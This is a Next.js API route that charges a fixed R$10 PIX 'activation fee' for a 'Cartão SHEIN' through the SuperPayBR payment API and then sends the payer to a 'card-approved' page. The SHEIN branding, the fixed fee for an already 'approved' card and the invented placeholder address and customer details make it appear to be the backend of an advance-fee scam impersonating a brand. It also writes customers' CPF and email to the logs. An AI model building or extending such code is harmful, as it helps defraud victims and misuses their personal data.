import { type NextRequest, NextResponse } from "next/server"
import { getSuperPayAccessToken } from "@/lib/superpaybr-auth"

export async function POST(request: NextRequest) {
  try {
    console.log("💳 === CRIANDO FATURA ATIVAÇÃO SUPERPAYBR ===")

    const body = await request.json()
    console.log("📥 Dados recebidos:", JSON.stringify(body, null, 2))

    // Valor fixo para ativação
    const amount = 10.0
    const externalId = body.externalId || `ACTIVATION_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`

    // Dados do cliente
    const cpfData = body.customerData || {}
    const userEmail = body.customerData?.email || ""
    const userWhatsApp = body.customerData?.phone || ""

    console.log("📋 Dados processados:", {
      externalId,
      amount,
      customerName: cpfData.nome || "Cliente SHEIN",
      email: userEmail,
    })

    // Obter access token
    const accessToken = await getSuperPayAccessToken()

    // Preparar dados da fatura de ativação
    const invoiceData = {
      customer: {
        name: cpfData.nome || body.customerData?.name || "Cliente SHEIN",
        document: (cpfData.cpf || body.customerData?.cpf || "00000000000").replace(/\D/g, ""),
        email: userEmail || "cliente@shein.com",
        phone: (userWhatsApp || "11999999999").replace(/\D/g, ""),
        address: {
          street: "Rua Principal",
          number: "123",
          district: "Centro",
          city: "São Paulo",
          state: "SP",
          postal_code: "01001000",
          complement: "",
        },
      },
      amount: amount,
      description: "Taxa de Ativação - Cartão SHEIN",
      external_id: externalId,
      payment_method: "pix",
      due_date: new Date(Date.now() + 30 * 60 * 1000).toISOString(),
      webhook_url: process.env.SUPERPAY_WEBHOOK_URL,
      return_url: `${request.nextUrl.origin}/card-approved`,
      cancel_url: `${request.nextUrl.origin}/checkout`,
      metadata: {
        type: "activation",
        product: "Cartão SHEIN",
        source: "activation",
      },
    }

    console.log("🚀 Enviando fatura de ativação...")

    const createResponse = await fetch("https://api.superpaybr.com/v4/invoices", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json",
        Authorization: `Bearer ${accessToken}`,
      },
      body: JSON.stringify(invoiceData),
    })

    if (!createResponse.ok) {
      const errorText = await createResponse.text()
      console.error("❌ Falha ao criar fatura de ativação:", errorText)
      return NextResponse.json(
        {
          success: false,
          error: "Falha ao criar fatura de ativação",
          details: errorText,
        },
        { status: 500 },
      )
    }

    const responseData = await createResponse.json()
    console.log("✅ Fatura de ativação criada!")

    // Extrair dados PIX
    let pixPayload = ""
    let qrCodeImage = ""
    let invoiceId = ""

    const findPixData = (obj: any): void => {
      if (!obj || typeof obj !== "object") return

      for (const [key, value] of Object.entries(obj)) {
        if ((key === "id" || key === "invoice_id") && typeof value === "string" && !invoiceId) {
          invoiceId = value
        }
        if (
          (key === "payload" || key === "pix_code" || key === "qrcode") &&
          typeof value === "string" &&
          value.length > 50
        ) {
          pixPayload = value
        }
        if ((key === "qrcode_image" || key === "qr_code" || key === "image") && typeof value === "string") {
          qrCodeImage = value
        }
        if (typeof value === "object" && value !== null) {
          findPixData(value)
        }
      }
    }

    findPixData(responseData)
    invoiceId = invoiceId || responseData.data?.id || responseData.id || externalId

    if (!pixPayload) {
      return NextResponse.json(
        {
          success: false,
          error: "PIX payload não encontrado para ativação",
          response_data: responseData,
        },
        { status: 500 },
      )
    }

    const qrCodeUrl =
      qrCodeImage || `https://quickchart.io/qr?text=${encodeURIComponent(pixPayload)}&size=300&format=png&margin=1`

    const response = {
      success: true,
      data: {
        id: invoiceId,
        invoice_id: invoiceId,
        external_id: externalId,
        pix: {
          payload: pixPayload,
          image: qrCodeUrl,
          qr_code: qrCodeUrl,
        },
        status: {
          code: 1,
          title: "Aguardando Pagamento",
          text: "pending",
        },
        valores: {
          bruto: Math.round(amount * 100),
          liquido: Math.round(amount * 100),
        },
        vencimento: {
          dia: new Date(Date.now() + 30 * 60 * 1000).toISOString().split("T")[0],
        },
        type: "real",
      },
    }

    console.log("✅ Fatura de ativação SuperPayBR criada!")
    return NextResponse.json(response)
  } catch (error) {
    console.error("❌ Erro ao criar fatura de ativação:", error)
    return NextResponse.json(
      {
        success: false,
        error: "Erro ao criar fatura de ativação",
        details: error instanceof Error ? error.message : "Erro desconhecido",
      },
      { status: 500 },
    )
  }
}
